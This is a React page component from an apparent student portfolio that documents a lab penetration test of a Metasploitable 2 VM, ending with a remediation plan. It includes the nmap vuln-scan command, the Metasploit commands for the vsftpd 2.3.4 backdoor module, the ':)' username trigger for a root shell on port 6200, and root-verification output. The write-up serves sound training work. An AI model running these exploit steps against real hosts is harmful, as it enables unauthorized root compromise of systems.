import pdfSrc from "../../../imports/Vulnerability_Assessment___Exploitation_Report.pdf";
import { DocNav, DocFooter, SectionDivider, SectionNumber, RiskBadge, CodeBlock, display, body, mono } from "../../components/DocShared";

export default function MetasploitableDocs() {
  return (
    <div className="min-h-screen bg-white text-gray-900" style={body}>
      <DocNav />

      {/* Hero */}
      <div className="border-b border-gray-200 bg-gray-50">
        <div className="max-w-4xl mx-auto px-6 py-14 md:py-20">
          <div className="flex flex-wrap gap-2 mb-6">
            {["Pen Testing", "Exploitation", "Metasploit", "Nmap"].map((t) => (
              <span key={t} className="text-[11px] tracking-[0.15em] uppercase text-gray-500 border border-gray-300 px-2.5 py-1 rounded-sm" style={mono}>{t}</span>
            ))}
          </div>
          <h1 className="text-3xl md:text-5xl font-semibold text-gray-900 leading-tight tracking-tight mb-6" style={display}>
            Vulnerability Assessment & Exploitation: Metasploitable 2
          </h1>
          <p className="text-lg text-gray-600 leading-relaxed max-w-2xl">
            Authorized exploitation simulation against a local Metasploitable 2 target. The assessment identified a critical vsftpd backdoor, exploited it to achieve verified root access, and produced a structured remediation plan.
          </p>
          <div className="mt-8 flex flex-wrap gap-6 text-[13px] text-gray-500" style={mono}>
            <span>Target: 10.0.2.15 (Metasploitable 2)</span>
            <span>Date: April 21, 2026</span>
            <span>Bincom Academy, Assignment 2</span>
          </div>
        </div>
      </div>

      <div className="max-w-4xl mx-auto px-6 py-14">

        {/* Overview */}
        <section>
          <SectionNumber n="01" />
          <h2 className="text-2xl font-semibold mt-2 mb-4" style={display}>Executive Summary</h2>
          <p className="text-gray-700 leading-relaxed mb-4">
            A full vulnerability assessment and authorized exploitation simulation was conducted against a deliberately vulnerable Metasploitable 2 VM running locally. The objective was to replicate a real-world penetration testing workflow: scan, identify, exploit, verify, remediate.
          </p>
          <div className="bg-red-50 border border-red-200 rounded-md p-5 text-[14px] text-red-800 leading-relaxed" style={mono}>
            <strong>Result:</strong> The assessment concluded with a successful compromise. Root-level (administrative) access was granted to the target system via the vsftpd 2.3.4 backdoor.
          </div>
        </section>

        <SectionDivider />

        {/* Objective */}
        <section>
          <SectionNumber n="02" />
          <h2 className="text-2xl font-semibold mt-2 mb-4" style={display}>Objective</h2>
          <ul className="space-y-2 text-gray-700 text-[15px]">
            {[
              "Perform a comprehensive service and version detection scan using Nmap NSE",
              "Identify misconfigured or outdated services that could be exploited",
              "Execute an authorized exploit against the identified vulnerability",
              "Verify the level of access gained (root vs. user)",
              "Provide a detailed, actionable remediation and mitigation plan",
            ].map((item) => (
              <li key={item} className="flex items-start gap-3">
                <span className="text-emerald-500 mt-1 shrink-0">→</span>
                <span>{item}</span>
              </li>
            ))}
          </ul>
        </section>

        <SectionDivider />

        {/* Methodology */}
        <section>
          <SectionNumber n="03" />
          <h2 className="text-2xl font-semibold mt-2 mb-8" style={display}>Approach</h2>

          <div className="space-y-10">
            <div>
              <h3 className="text-lg font-semibold mb-3" style={display}>Step 1: Nmap Vulnerability Scan</h3>
              <p className="text-gray-700 leading-relaxed mb-3">A comprehensive scan combining service version detection (<code className="bg-gray-100 px-1.5 py-0.5 rounded text-[13px]" style={mono}>-sV</code>) with the Nmap Scripting Engine vulnerability scripts to map open ports and flag known CVEs.</p>
              <CodeBlock>{`nmap -sV --script=vuln 10.0.2.15`}</CodeBlock>
            </div>

            <div>
              <h3 className="text-lg font-semibold mb-3" style={display}>Step 2: Exploit Selection & Configuration</h3>
              <p className="text-gray-700 leading-relaxed mb-3">The scan identified vsftpd 2.3.4 on Port 21, a version with a known malicious backdoor. Loaded the corresponding Metasploit module and configured target parameters.</p>
              <CodeBlock>{`msfconsole
use exploit/unix/ftp/vsftpd_234_backdoor
set RHOSTS 10.0.2.15
set LHOST <attacker-IP>
run`}</CodeBlock>
            </div>

            <div>
              <h3 className="text-lg font-semibold mb-3" style={display}>Step 3: Exploitation & Verification</h3>
              <p className="text-gray-700 leading-relaxed mb-3">Executed the exploit. The backdoor was triggered by sending a username containing <code className="bg-gray-100 px-1.5 py-0.5 rounded text-[13px]" style={mono}>:)</code>, which opens a command shell on Port 6200. A Meterpreter session was established and system commands were run to confirm root access.</p>
              <CodeBlock>{`# Post-exploit verification
whoami     → root
id         → uid=0(root) gid=0(root) groups=0(root)
hostname   → metasploitable`}</CodeBlock>
            </div>
          </div>
        </section>

        <SectionDivider />

        {/* Key Findings */}
        <section>
          <SectionNumber n="04" />
          <h2 className="text-2xl font-semibold mt-2 mb-6" style={display}>The VSFTPD Backdoor</h2>

          <div className="border border-red-200 bg-red-50 rounded-md p-6 mb-6">
            <div className="flex flex-wrap items-start justify-between gap-4 mb-4">
              <div>
                <h3 className="font-semibold text-gray-900 text-lg" style={display}>vsftpd 2.3.4: Malicious Backdoor</h3>
                <p className="text-[13px] text-gray-500 mt-1" style={mono}>FTP Service · Port 21</p>
              </div>
              <RiskBadge level="CRITICAL" />
            </div>
            <p className="text-[14px] text-gray-700 leading-relaxed mb-3">
              This version of vsftpd contains a deliberately introduced backdoor. When a login attempt is made with a username containing the <code className="bg-white px-1.5 py-0.5 rounded border border-red-200 text-[13px]" style={mono}>:)</code> string, the server automatically opens a root shell on port 6200, bypassing all authentication entirely.
            </p>
            <div className="grid sm:grid-cols-2 gap-4 text-[13px]" style={mono}>
              <div><span className="text-gray-500">CVE:</span> vsftpd 2.3.4 Backdoor (well-documented)</div>
              <div><span className="text-gray-500">Service:</span> OpenSSH / vsftpd on Port 21</div>
              <div><span className="text-gray-500">Impact:</span> Full system compromise (root)</div>
              <div><span className="text-gray-500">Confidence:</span> Confirmed, PoC executed</div>
            </div>
          </div>
        </section>

        <SectionDivider />

        {/* Risks */}
        <section>
          <SectionNumber n="05" />
          <h2 className="text-2xl font-semibold mt-2 mb-4" style={display}>Impact of Compromise</h2>
          <div className="space-y-3 text-gray-700 text-[15px]">
            {[
              { risk: "Complete system takeover", detail: "Root access means an attacker can install backdoors, read all files, modify configurations, and use the machine as a pivot point into the wider network." },
              { risk: "Lateral movement", detail: "With root on one machine, an attacker can use it to probe and attack other systems on the same network segment." },
              { risk: "Data exfiltration", detail: "All data on the system including credentials, databases, and sensitive files is readable and exportable." },
              { risk: "Persistence", detail: "An attacker with root can install cron jobs, SSH keys, or rootkits to maintain access even after reboots." },
            ].map((item) => (
              <div key={item.risk} className="border border-gray-200 rounded-md p-4">
                <span className="font-semibold text-gray-900">{item.risk}: </span>
                <span className="text-gray-600">{item.detail}</span>
              </div>
            ))}
          </div>
        </section>

        <SectionDivider />

        {/* Remediation */}
        <section>
          <SectionNumber n="06" />
          <h2 className="text-2xl font-semibold mt-2 mb-6" style={display}>Mitigation Plan</h2>
          <div className="space-y-5">
            <div className="border-l-4 border-red-400 pl-5">
              <h4 className="font-semibold text-gray-900 mb-1" style={display}>Immediate: Stop the Service</h4>
              <p className="text-[14px] text-gray-600 leading-relaxed mb-2">Disable vsftpd immediately to close the active backdoor.</p>
              <CodeBlock>{`sudo service vsftpd stop
sudo systemctl disable vsftpd`}</CodeBlock>
            </div>
            <div className="border-l-4 border-orange-400 pl-5">
              <h4 className="font-semibold text-gray-900 mb-1" style={display}>Patch: Replace vsftpd 2.3.4</h4>
              <p className="text-[14px] text-gray-600 leading-relaxed">Uninstall the backdoored version and install the latest stable release from an official repository if FTP is genuinely required.</p>
            </div>
            <div className="border-l-4 border-yellow-400 pl-5">
              <h4 className="font-semibold text-gray-900 mb-1" style={display}>Long-Term: Replace FTP with SFTP</h4>
              <p className="text-[14px] text-gray-600 leading-relaxed">Standard FTP transmits credentials and data in cleartext. Deprecate FTP entirely and use SFTP (SSH File Transfer Protocol) which encrypts the connection end-to-end.</p>
            </div>
            <div className="border-l-4 border-gray-300 pl-5">
              <h4 className="font-semibold text-gray-900 mb-1" style={display}>Network: Firewall Port 21</h4>
              <p className="text-[14px] text-gray-600 leading-relaxed mb-2">Port 21 should never be open to the public internet. Restrict it to specific authorized IPs via firewall rules.</p>
              <CodeBlock>{`# Block public access to FTP
sudo ufw deny 21/tcp
# Allow only whitelisted IP
sudo ufw allow from <trusted-ip> to any port 21`}</CodeBlock>
            </div>
          </div>
        </section>

        <SectionDivider />

        {/* What I Learned */}
        <section>
          <SectionNumber n="07" />
          <h2 className="text-2xl font-semibold mt-2 mb-4" style={display}>What I Learned</h2>
          <div className="space-y-3 text-gray-700 text-[15px] leading-relaxed">
            <p><strong>The full pentest workflow is a loop, not a line.</strong> Scan → identify → exploit → verify → remediate. Each phase informs the next, and the remediation is as important as the exploitation.</p>
            <p><strong>Version numbers matter enormously.</strong> The entire compromise came down to a version number: vsftpd 2.3.4 vs. any safe version. This underscores why patch management is non-negotiable.</p>
            <p><strong>Nmap + NSE is powerful for enumeration.</strong> Running <code className="bg-gray-100 px-1.5 py-0.5 rounded text-[13px]" style={mono}>--script=vuln</code> alongside <code className="bg-gray-100 px-1.5 py-0.5 rounded text-[13px]" style={mono}>-sV</code> surfaces CVEs during the scan, not just ports and services.</p>
            <p><strong>The attacker's perspective changes your defensive mindset.</strong> After executing this exploit, the importance of network segmentation, least-privilege, and service minimisation became concrete rather than abstract.</p>
          </div>
        </section>
      </div>

      <DocFooter pdfSrc={pdfSrc} label="View Full Assessment Report" />
    </div>
  );
}
